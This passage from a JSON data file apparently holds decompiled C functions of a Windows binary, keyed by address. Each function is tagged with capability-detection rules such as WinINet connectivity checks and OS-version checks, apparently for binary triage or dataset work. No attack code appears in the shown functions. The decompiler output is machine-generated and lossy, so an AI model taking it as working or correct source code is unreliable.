            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_228h\n\nint32_t __cdecl fcn.00018b30(int32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, int32_t **arg_18h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t var_228h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint32_t var_14h;\n    int32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    int32_t *var_4h;\n    \n    var_4h = NULL;\n    if (arg_8h == 0) {\n        var_10h = 0x21590065;\n    }\n    else if (arg_18h == NULL) {\n        var_10h = 0x21590069;\n    }\n    else {\n        *arg_18h = NULL;\n        var_4h = fcn.00035200(8);\n        if (var_4h == NULL) {\n            var_10h = 0x21590004;\n        }\n        else {\n            var_4h[1] = 0;\n            iVar2 = fcn.00018330(arg_8h);\n            *var_4h = iVar2;\n            if (*var_4h == 0) {\n                var_10h = 0x21590004;\n            }\n            else {\n                var_14h = 1;\n                for (var_8h = 0; var_4h[var_8h] != 0; var_8h = var_8h + 1) {\n                    var_10h = fcn.000184b0(arg_ch, arg_14h, var_4h[var_8h]);\n                    if (var_10h != 0) goto code_r0x00018dc8;\n                    if (arg_10h != '\\0') {\n                        var_228h = var_4h[var_8h];\n                        iVar2 = fcn.00018ad0(var_228h, 0x10);\n                        piVar1 = var_4h;\n                        if (0 < iVar2) {\n                            iVar3 = fcn.0001d7c0(&var_4h, var_14h * 4 + 4, (var_14h + 1 + iVar2) * 4);\n                            if (iVar3 == -1) {\n                                var_10h = 0x21590004;\n                                var_4h = piVar1;\n                                goto code_r0x00018dc8;\n                            }\n                            for (var_ch = var_14h; var_ch < var_14h + 1 + iVar2; var_ch = var_ch + 1) {\n                                var_4h[var_ch] = 0;\n                            }\n                            var_18h = 0;\n                            for (var_ch = var_14h; var_ch < var_14h + iVar2; var_ch = var_ch + 1) {\n                                while ((*(*(var_4h[var_8h] + 0x1c) + var_18h * 4) != 0 &&\n                                       ((*(*(*(var_4h[var_8h] + 0x1c) + var_18h * 4) + 0x14) & 0x10) == 0))) {\n                                    var_18h = var_18h + 1;\n                                }\n                                if (*(*(var_4h[var_8h] + 0x1c) + var_18h * 4) == 0) {\n                                    fcn.00078556(&var_228h, 0x104, 0xb1bde684, *var_4h[var_8h]);\n                                }\n                                else {\n                                    fcn.00078556(&var_228h, 0x104, 0xb1bde678, *var_4h[var_8h], \n                                                 **(*(var_4h[var_8h] + 0x1c) + var_18h * 4));\n                                }\n                                iVar3 = fcn.00018330(&var_228h);\n                                var_4h[var_ch] = iVar3;\n                                if (var_4h[var_ch] == 0) {\n                                    var_10h = 0x21590004;\n                                    goto code_r0x00018dc8;\n                                }\n                                var_18h = var_18h + 1;\n                            }\n                            var_14h = var_14h + iVar2;\n                        }\n                    }\n                }\n                var_10h = 0;\n                *arg_18h = var_4h;\n            }\ncode_r0x00018dc8:\n            if (var_10h != 0) {\n                for (var_ch = 0; var_4h[var_ch] != 0; var_ch = var_ch + 1) {\n                    fcn.00018e50(var_4h[var_ch]);\n                }\n                fcn.00035330(var_4h);\n            }\n        }\n    }\n    return var_10h;\n}\n",
        "token_count": 1154
    },
    "00018e20": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00018e20(uint *arg_8h)\n\n{\n    if (arg_8h != NULL) {\n        fcn.00035330(*arg_8h);\n        fcn.00035330(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 61
    },
    "00018e50": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00018e50(uint *arg_8h)\n\n{\n    int32_t var_4h;\n    \n    if (arg_8h != NULL) {\n        for (var_4h = 0; (arg_8h[7] != 0 && (*(arg_8h[7] + var_4h * 4) != 0)); var_4h = var_4h + 1) {\n            var_4h = *(arg_8h[7] + var_4h * 4);\n            fcn.00018e20(var_4h);\n        }\n        fcn.00035330(*arg_8h);\n        fcn.00035330(arg_8h[7]);\n        fcn.00035330(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 197
    },
    "00018ed0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.00018ed0(void)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    fcn.000344f0(0xb1c5a938);\n    fcn.00036f50(0xb1c5a93c);\n    *0xb1c5a934 = 1;\n    iVar1 = fcn.0001a8e0(0xb1c5998c, 0xb1be68c0, 0);\n    if (iVar1 != 0) {\n        fcn.000371b0(0xb1c5a93c);\n        fcn.00034520(0xb1c5a938);\n    }\n    return iVar1;\n}\n",
        "token_count": 163
    },
    "00019000": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_54h\n\nvoid fcn.00019000(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint var_54h;\n    uint var_4ch;\n    uint *var_48h;\n    uint32_t var_44h;\n    uint var_40h;\n    int32_t var_3ch;\n    int32_t var_38h;\n    int32_t var_34h;\n    uint var_30h;\n    uint32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_8h;\n    \n    var_38h = 0;\n    var_34h = 0;\n    if ((*0xb1c5a934 != '\\0') && (iVar2 = fcn.0001b770(0xb1c5a948, 1, 0),  iVar2 == 0)) {\n        iVar2 = fcn.000785da(0xffffffff, 0, &var_18h, 0x18, 0);\n        if ((iVar2 == 0) &&\n           ((((var_18h == 0x103 && (var_8h != 0)) && (var_8h != *(*0xb1c59660 + 0x14))) &&\n            ((iVar2 = fcn.00036880(&var_30h, 0x10),  iVar2 != 0 && (iVar2 = fcn.00034570(0xb1c5a938),  iVar2 != 0))))))\n        {\n            for (var_20h = 0; var_20h < 0x32; var_20h = var_20h + 1) {\n                if ((*(var_20h * 0x24 + -0x4e3a569f) != '\\0') && (*(var_20h * 0x24 + -0x4e3a56a0) != '\\0')) {\n                    var_48h = &var_30h;\n                    do {\n                        cVar1 = *var_48h;\n                        var_48h = var_48h + 1;\n                    } while (cVar1 != '\\0');\n                    var_1ch = var_48h - (&var_30h + 1);\n                    var_3ch = *(var_20h * 0x24 + -0x4e3a56b4) + -1;\n                    while ((var_3ch != 0 &&\n                           (((var_3ch = var_3ch + 1,  *(var_3ch + var_1ch) != ',' && (*(var_3ch + var_1ch) != '\\0')) ||\n                            (iVar2 = fcn.000785c8(&var_30h, var_3ch, var_1ch),  iVar2 != 0))))) {\n                        var_3ch = fcn.000785ce(var_3ch, 0x2c);\n                    }\n                    if (var_3ch != 0) {\n                        for (var_44h = 0; var_44h < *(var_20h * 0x24 + -0x4e3a5698); var_44h = var_44h + 1) {\n                            if ((*(*(var_20h * 0x24 + -0x4e3a5694) + 0x10 + var_44h * 0x20) != 0) &&\n                               (iVar2 = fcn.000370a0(0xb1c5a93c, 1),  iVar2 != 0)) {\n                                fcn.0007877e(var_44h * 0x20 + *(var_20h * 0x24 + -0x4e3a5694), \n                                             (var_44h + 1) * 0x20 + *(var_20h * 0x24 + -0x4e3a5694), \n                                             ((*(var_20h * 0x24 + -0x4e3a5698) - var_44h) + -1) * 0x20);\n                                fcn.0001d7c0(var_20h * 0x24 + -0x4e3a5694, *(var_20h * 0x24 + -0x4e3a5698) << 5, \n                                             (*(var_20h * 0x24 + -0x4e3a5698) + -1) * 0x20);\n                                *(var_20h * 0x24 + -0x4e3a5698) = *(var_20h * 0x24 + -0x4e3a5698) + -1;\n                                fcn.00037060(0xb1c5a93c, 1);\n                                fcn.000345c0(0xb1c5a938);\n                                goto code_r0x00019560;\n                            }\n                            if (*(*(var_20h * 0x24 + -0x4e3a5694) + 4 + var_44h * 0x20) == var_8h) break;\n                        }\n                        if (var_44h < *(var_20h * 0x24 + -0x4e3a5698)) {\n                            var_34h = var_44h * 0x20 + *(var_20h * 0x24 + -0x4e3a5694);\n                            if (((((*(*(var_20h * 0x24 + -0x4e3a5694) + 0x14 + var_44h * 0x20) == 0) &&\n                                  (*(*(var_20h * 0x24 + -0x4e3a5694) + 8 + var_44h * 0x20) == 0)) &&\n                                 ((*(*(var_20h * 0x24 + -0x4e3a5694) + 0xc + var_44h * 0x20) == 0 &&\n                                  (iVar2 = fcn.00035e60(0), \n                                  0x13 < iVar2 - *(*(var_20h * 0x24 + -0x4e3a5694) + var_44h * 0x20))))) &&\n                                ((*(var_20h * 0x24 + -0x4e3a569e) == '\\0' ||\n                                 (iVar2 = fcn.0001b770(var_20h * 0x24 + -0x4e3a569c, 0, 0),  iVar2 < 1)))) &&\n                               ((*(var_20h * 0x24 + -0x4e3a56a4) == 0 ||\n                                (iVar2 = fcn.00018fb0(*(var_20h * 0x24 + -0x4e3a56a4)),  iVar2 != 0)))) {\n                                fcn.000569a0(var_20h * 0x24 + -0x4e3a569c);\n                                fcn.00036f80(0xb1c5a93c, 0);\n                                var_38h = var_20h * 0x24 + -0x4e3a56b4;\n                                *(var_34h + 8) = 1;\n                                break;\n                            }\n                        }\n                        else {\n                            iVar2 = *(var_20h * 0x24 + -0x4e3a5698);\n                            iVar3 = fcn.0001d7c0(var_20h * 0x24 + -0x4e3a5694, iVar2 << 5, (iVar2 + 1) * 0x20);\n                            if (iVar3 == 0) {\n                                *(*(var_20h * 0x24 + -0x4e3a5694) + 4 + iVar2 * 0x20) = var_8h;\n                                *(*(var_20h * 0x24 + -0x4e3a5694) + 0x14 + iVar2 * 0x20) = 0;\n                                uVar4 = fcn.00035e60(0);\n                                *(iVar2 * 0x20 + *(var_20h * 0x24 + -0x4e3a5694)) = uVar4;\n                                *(*(var_20h * 0x24 + -0x4e3a5694) + 8 + iVar2 * 0x20) = 0;\n                                *(*(var_20h * 0x24 + -0x4e3a5694) + 0xc + iVar2 * 0x20) = 0;\n                                *(*(var_20h * 0x24 + -0x4e3a5694) + 0x10 + iVar2 * 0x20) = 0;\n                                *(*(var_20h * 0x24 + -0x4e3a5694) + 0x18 + iVar2 * 0x20) = 0;\n                                *(*(var_20h * 0x24 + -0x4e3a5694) + 0x1c + iVar2 * 0x20) = 0;\n                                *(var_20h * 0x24 + -0x4e3a5698) = *(var_20h * 0x24 + -0x4e3a5698) + 1;\n                            }\n                        }\n                    }\n                }\n            }\n            fcn.000345c0(0xb1c5a938);\n            if ((var_20h < 0x32) && (iVar2 = fcn.000197b0(var_38h, var_34h, 0xb1be6fc0, 0),  iVar2 != 0)) {\n                *(var_34h + 8) = 0;\n                fcn.00037060(0xb1c5a93c, 0);\n            }\n        }\ncode_r0x00019560:\n        fcn.000674e0(0xb1c5a948);\n    }\n    return;\n}\n",
        "token_count": 2297
    },
    "00019570": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00019570(char *arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_24h;\n    uint var_1ch;\n    char *var_18h;\n    uint32_t var_14h;\n    int32_t var_10h;\n    uint32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*0xb1c5a934 != '\\0') {\n        fcn.00034550(0xb1c5a938);\n        for (var_ch = 0; var_ch < 0x32; var_ch = var_ch + 1) {\n            if ((*(var_ch * 0x24 + -0x4e3a569f) != '\\0') && (*(var_ch * 0x24 + -0x4e3a56a0) != '\\0')) {\n                var_10h = *(var_ch * 0x24 + -0x4e3a56b4);\n                var_18h = arg_8h;\n                do {\n                    cVar1 = *var_18h;\n                    var_18h = var_18h + 1;\n                } while (cVar1 != '\\0');\n                iVar2 = var_18h - (arg_8h + 1);\n                var_14h = 0;\n                while (((*(var_10h + iVar2) != ',' && (*(var_10h + iVar2) != '\\0')) ||\n                       (iVar3 = fcn.000785c8(arg_8h, var_10h, iVar2),  iVar3 != 0))) {\n                    var_10h = fcn.000785ce(var_10h, 0x2c);\n                    var_14h = var_14h + 1 + iVar2;\n                    if ((var_10h == 0) || (0x103 < var_14h + iVar2)) break;\n                }\n                if (var_10h != 0) {\n                    for (var_14h = 0; var_14h < *(var_ch * 0x24 + -0x4e3a5698); var_14h = var_14h + 1) {\n                        if (*(*(var_ch * 0x24 + -0x4e3a5694) + 4 + var_14h * 0x20) == arg_ch) {\n                            if ((*(*(var_ch * 0x24 + -0x4e3a5694) + 0x14 + var_14h * 0x20) == 0) ||\n                               (*(*(var_ch * 0x24 + -0x4e3a5694) + 0x10 + var_14h * 0x20) != 0)) {\n                                *(*(var_ch * 0x24 + -0x4e3a5694) + 0x10 + var_14h * 0x20) = 1;\n                            }\n                            else {\n                                *(*(var_ch * 0x24 + -0x4e3a5694) + 0x10 + var_14h * 0x20) = 1;\n                                fcn.00036f80(0xb1c5a93c, 0);\n                                iVar2 = fcn.000197b0(var_ch * 0x24 + -0x4e3a56b4, \n                                                     var_14h * 0x20 + *(var_ch * 0x24 + -0x4e3a5694), 0xb1be71d0, 1);\n                                if (iVar2 != 0) {\n                                    fcn.00037060(0xb1c5a93c, 0);\n                                }\n                            }\n                            break;\n                        }\n                    }\n                }\n            }\n        }\n        fcn.000345c0(0xb1c5a938);\n    }\n    return;\n}\n",
        "token_count": 888
    },
    "000197b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.000197b0(uint arg_8h, uint arg_ch, code *arg_10h, uint arg_14h)\n\n{\n    uint *arg_10h_00;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_4h;\n    \n    var_10h = 0;\n    var_4h = fcn.000785d4(0xffffffff, 6, &var_10h, 4);\n    if (var_4h == 0) {\n        arg_10h_00 = fcn.00035200(0xc);\n        if (arg_10h_00 == NULL) {\n            var_4h = 0x21590004;\n        }\n        else {\n            *arg_10h_00 = arg_8h;\n            arg_10h_00[1] = arg_ch;\n            var_4h = (**0xb1bde2a4)(0xfffffffe, 0, 0, 0, arg_10h_00 + 2, 0);\n            if (var_4h == 0) {\n                if (arg_14h == '\\0') {\n                    var_4h = fcn.0001a8e0(&var_ch, arg_10h, arg_10h_00);\n                    if (var_4h != 0) {\n                        (**0xb1bde2e4)();\n                        fcn.00035330(arg_10h_00);\n                        return var_4h;\n                    }\n                }\n                else {\n                    var_4h = (*arg_10h)(arg_10h_00);\n                }\n                if (arg_14h == '\\0') {\n                    fcn.00037310(&var_ch);\n                    fcn.00037270(&var_ch, 0);\n                    fcn.00037220(&var_ch);\n                }\n                var_4h = 0;\n            }\n            else {\n                fcn.00035330(arg_10h_00);\n            }\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 464
    },
    "00019940": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_14h\n\nuint32_t __cdecl fcn.00019940(int32_t **arg_8h, uint32_t *arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t *var_14h;\n    int32_t *var_10h;\n    uint32_t var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    piVar1 = fcn.00035200(13000);\n    *arg_8h = piVar1;\n    if (*arg_8h == NULL) {\n        return 0;\n    }\n    *arg_ch = 0;\n    var_8h = 0x28b;\n    while ((var_8h < 0x2be && (*arg_ch + 0x104 < 13000))) {\n        iVar2 = fcn.00029090(var_8h, *arg_8h + *arg_ch, 0x104, &var_4h);\n        if (iVar2 == 0) {\n            *arg_ch = (var_4h - 1) + *arg_ch;\n        }\n        *(*arg_8h + *arg_ch) = 0;\n        *arg_ch = *arg_ch + 1;\n        var_8h = var_8h + 1;\n    }\n    fcn.00034550(0xb1c5a938);\n    if ((*0xb1c5b05c != NULL) && (*arg_ch == *0xb1c5b054)) {\n        var_ch = *arg_ch;\n        var_10h = *0xb1c5b05c;\n        var_14h = *arg_8h;\n        for (; 3 < var_ch; var_ch = var_ch - 4) {\n            if (*var_14h != *var_10h) goto code_r0x00019a58;\n            var_10h = var_10h + 1;\n            var_14h = var_14h + 1;\n        }\n        if (var_ch == 0) {\ncode_r0x00019ada:\n            var_1ch = 0;\n        }\n        else {\ncode_r0x00019a58:\n            var_18h = *var_14h - *var_10h;\n            if (var_18h == 0) {\n                if (var_ch == 1) goto code_r0x00019ada;\n                var_18h = *(var_14h + 1) - *(var_10h + 1);\n                if (var_18h == 0) {\n                    if (var_ch == 2) goto code_r0x00019ada;\n                    var_18h = *(var_14h + 2) - *(var_10h + 2);\n                    if (var_18h == 0) {\n                        if ((var_ch == 3) || (var_18h = *(var_14h + 3) - *(var_10h + 3),  var_18h == 0))\n                        goto code_r0x00019ada;\n                    }\n                }\n            }\n            var_1ch = 1;\n            if (var_18h < 1) {\n                var_1ch = -1;\n            }\n        }\n        if (var_1ch == 0) {\n            for (var_8h = 0; var_8h < 0x32; var_8h = var_8h + 1) {\n                if ((*(var_8h * 0x24 + -0x4e3a569f) != '\\0') && (*(var_8h * 0x24 + -0x4e3a56a0) != '\\0')) {\n                    for (var_4h = 0; var_4h < *(var_8h * 0x24 + -0x4e3a5698); var_4h = var_4h + 1) {\n                        *(*(var_8h * 0x24 + -0x4e3a5694) + 8 + var_4h * 0x20) = 0;\n                    }\n                }\n            }\n            var_8h = 0;\n            goto code_r0x00019b92;\n        }\n    }\n    var_8h = 1;\ncode_r0x00019b92:\n    fcn.000345c0(0xb1c5a938);\n    if (var_8h == 0) {\n        fcn.00035330(*arg_8h);\n    }\n    return var_8h;\n}\n",
        "token_count": 1106
    },
    "00019bc0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00019bc0(uint8_t *arg_8h, int32_t arg_ch)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uchar *puVar3;\n    uint8_t *puVar4;\n    char *pcVar5;\n    bool bVar6;\n    uint var_28h;\n    int32_t var_24h;\n    uint8_t *var_1ch;\n    uint8_t *var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint8_t *var_8h;\n    uint var_4h;\n    \n    iVar2 = fcn.00035200(arg_ch);\n    if (iVar2 != 0) {\n        fcn.0007877e(iVar2, arg_8h, arg_ch);\n        fcn.00034550(0xb1c5a938);\n        fcn.00035330(*0xb1c5b05c);\n        *0xb1c5b058 = arg_8h;\n        *0xb1c5b054 = arg_ch;\n        puVar4 = arg_8h + arg_ch;\n        var_14h = 0;\n        *0xb1c5b05c = iVar2;\n        while (arg_8h < puVar4) {\n            for (var_8h = arg_8h; (*var_8h != 0 && (var_8h < puVar4)); var_8h = var_8h + 1) {\n            }\n            if ((*arg_8h != 0) && (puVar3 = fcn.000785ce(arg_8h, 0x23),  puVar3 != NULL)) {\n                *puVar3 = 0;\n                var_18h = 0xb1bde698;\n                var_1ch = arg_8h;\n                do {\n                    uVar1 = *var_1ch;\n                    bVar6 = uVar1 < *var_18h;\n                    if (uVar1 != *var_18h) {\ncode_r0x00019cf4:\n                        var_24h = (1 - bVar6) - (bVar6 != 0);\n                        goto code_r0x00019cfc;\n                    }\n                    if (uVar1 == 0) break;\n                    uVar1 = var_1ch[1];\n                    bVar6 = uVar1 < var_18h[1];\n                    if (uVar1 != var_18h[1]) goto code_r0x00019cf4;\n                    var_1ch = var_1ch + 2;\n                    var_18h = var_18h + 2;\n                } while (uVar1 != 0);\n                var_24h = 0;\ncode_r0x00019cfc:\n                if (var_24h == 0) {\n                    *(var_14h * 0x24 + -0x4e3a56b4) = puVar3 + 1;\n                    puVar3 = fcn.000785ce(puVar3 + 1, 0x23);\n                    if (puVar3 != NULL) {\n                        *puVar3 = 0;\n                        *(var_14h * 0x24 + -0x4e3a56ac) = puVar3 + 1;\n                        puVar3 = fcn.000785ce(puVar3 + 1, 0x23);\n                        if (puVar3 != NULL) {\n                            *puVar3 = 0;\n                            *(var_14h * 0x24 + -0x4e3a56a8) = puVar3 + 1;\n                            puVar3 = fcn.000785ce(puVar3 + 1, 0x23);\n                            if (puVar3 != NULL) {\n                                *puVar3 = 0;\n                                pcVar5 = puVar3 + 1;\n                                if ((puVar3[2] == '#') || (puVar3[2] == '\\0')) {\n                                    if ((*pcVar5 == '1') || ((*pcVar5 == 'y' || (*pcVar5 == 'Y')))) {\n                                        *(var_14h * 0x24 + -0x4e3a569e) = 1;\n                                    }\n                                    else {\n                                        if (((*pcVar5 != '0') && (*pcVar5 != 'n')) && (*pcVar5 != 'N'))\n                                        goto code_r0x00019ecd;\n                                        *(var_14h * 0x24 + -0x4e3a569e) = 0;\n                                    }\n                                    puVar3 = fcn.000785ce(pcVar5, 0x23);\n                                    if (puVar3 == NULL) {\n                                        *(var_14h * 0x24 + -0x4e3a56a4) = 0;\n                                    }\n                                    else {\n                                        *puVar3 = 0;\n                                        *(var_14h * 0x24 + -0x4e3a56a4) = puVar3 + 1;\n                                    }\n                                    *(var_14h * 0x24 + -0x4e3a569f) = 1;\n                                    *(var_14h * 0x24 + -0x4e3a56a0) = 1;\n                                    *(var_14h * 0x24 + -0x4e3a5698) = 0;\n                                    *(var_14h * 0x24 + -0x4e3a569c) = 0;\n                                    *(var_14h * 0x24 + -0x4e3a5694) = 0;\n                                }\n                            }\n                        }\n                    }\n                }\n            }\ncode_r0x00019ecd:\n            var_14h = var_14h + 1;\n            arg_8h = var_8h + 1;\n        }\n        fcn.000345c0(0xb1c5a938);\n    }\n    return;\n}\n",
        "token_count": 1336
    },
    "00019f00": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00019f00(uint arg_8h, int32_t arg_ch, uint arg_10h)\n\n{\n    int32_t arg_10h_00;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_8h = fcn.00035eb0(arg_ch + 1, 0, 0);\n    var_4h = fcn.000290b0(3, var_8h, 0, 0, &var_ch, 0);\n    if (var_4h == 0) {\n        arg_10h_00 = fcn.00035200(var_ch);\n        if (arg_10h_00 == 0) {\n            var_4h = 0x21590004;\n        }\n        else {\n            var_4h = fcn.000290b0(3, var_8h, arg_10h_00, var_ch, &var_ch, 0);\n            if (var_4h == 0) {\n                var_4h = fcn.0005cbd0(arg_8h, arg_10h_00, arg_ch, arg_ch, arg_10h);\n            }\n            fcn.00035330(arg_10h_00);\n        }\n    }\n    else {\n        var_4h = var_4h + 0x191 | 0x21590000;\n    }\n    return var_4h;\n}\n",
        "token_count": 334
    },
    "00019fc0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00019fc0(int32_t *arg_8h)\n\n{\n    uint var_ch;\n    int32_t var_5h;\n    \n    *NULL = fcn.0005a0d0(*(arg_8h[1] + 4), &var_5h);\n    if (*NULL == 0) {\n        if (var_5h == '\\0') {\n            *(*arg_8h + 4) = *(*arg_8h + 0xc);\n        }\n        else {\n            *(*arg_8h + 4) = *(*arg_8h + 8);\n        }\n        if (**(*arg_8h + 4) == '&') {\n            *NULL = fcn.00019f00(*(arg_8h[1] + 4), *(*arg_8h + 4), arg_8h[1] + 0x14);\n        }\n        else {\n            *NULL = fcn.0005d250(*(arg_8h[1] + 4), *(*arg_8h + 4), arg_8h[1] + 0x14);\n        }\n        if (stack0xfffffff8 == 0) {\n            *NULL = fcn.0005cb50(*(arg_8h[1] + 4), *(arg_8h[1] + 0x14), 0xb1bde69c, arg_8h[1] + 0x18);\n            if (*NULL == 0) {\n                fcn.0005cb50(*(arg_8h[1] + 4), *(arg_8h[1] + 0x14), 0xb1bde6a8, arg_8h[1] + 0x1c);\n                *NULL = fcn.0005ae70(*(arg_8h[1] + 4), *(arg_8h[1] + 0x18), 0, 0);\n                if (*NULL == 0) {\n                    *(arg_8h[1] + 8) = 0;\n                }\n                else {\n                    fcn.0005d930(*(arg_8h[1] + 4), *(arg_8h[1] + 0x14), 1);\n                }\n            }\n            else {\n                fcn.0005d930(*(arg_8h[1] + 4), *(arg_8h[1] + 0x14), 1);\n            }\n        }\n    }\n    if (stack0xfffffff8 != 0) {\n        *(arg_8h[1] + 0x14) = 0;\n        *(arg_8h[1] + 0x18) = 0;\n        *(arg_8h[1] + 0x1c) = 0;\n        *(arg_8h[1] + 8) = 1;\n        if (stack0xfffffff8 == 0x21590206) {\n            *(arg_8h[1] + 0xc) = 1;\n        }\n        fcn.000674e0(*arg_8h + 0x18);\n    }\n    fcn.00037060(0xb1c5a93c, 0);\n    (**0xb1bde2e4)();\n    fcn.00035330(arg_8h);\n    return stack0xfffffff8;\n}\n",
        "token_count": 759
    },
    "0001a1d0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0001a1d0(int32_t *arg_8h)\n\n{\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    if (*(arg_8h[1] + 0x1c) != 0) {\n        var_4h = fcn.0005ae70(*(arg_8h[1] + 4), *(arg_8h[1] + 0x1c), 0, 0);\n    }\n    if (var_4h == 0) {\n        var_4h = fcn.0005d930(*(arg_8h[1] + 4), *(arg_8h[1] + 0x14), 1);\n    }\n    fcn.000674e0(*arg_8h + 0x18);\n    fcn.00037060(0xb1c5a93c, 0);\n    (**0xb1bde2e4)();\n    fcn.00035330(arg_8h);\n    return var_4h;\n}\n",
        "token_count": 247
    },
    "0001a270": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_18h\n\nvoid fcn.0001a270(void)\n\n{\n    int32_t iVar1;\n    uint32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    var_ch = 0;\n    var_10h = 0;\n    do {\n        var_14h = 0;\n        var_4h = -1;\n        while( true ) {\n            fcn.00034550(0xb1c5a938);\n            iVar1 = fcn.000370a0(0xb1c5a93c, 1);\n            if (iVar1 != 0) break;\n            fcn.000345c0(0xb1c5a938);\n            fcn.000209a0(0x14);\n        }\n        for (var_8h = 0; var_8h < 0x32; var_8h = var_8h + 1) {\n            *(var_8h * 0x24 + -0x4e3a56a0) = 0;\n            if (*(var_8h * 0x24 + -0x4e3a569f) != '\\0') {\n                for (var_18h = 0; var_18h < *(var_8h * 0x24 + -0x4e3a5698); var_18h = var_18h + 1) {\n                    if ((*(*(var_8h * 0x24 + -0x4e3a5694) + 0x14 + var_18h * 0x20) != 0) &&\n                       (*(*(var_8h * 0x24 + -0x4e3a5694) + 0x10 + var_18h * 0x20) == 0)) {\n                        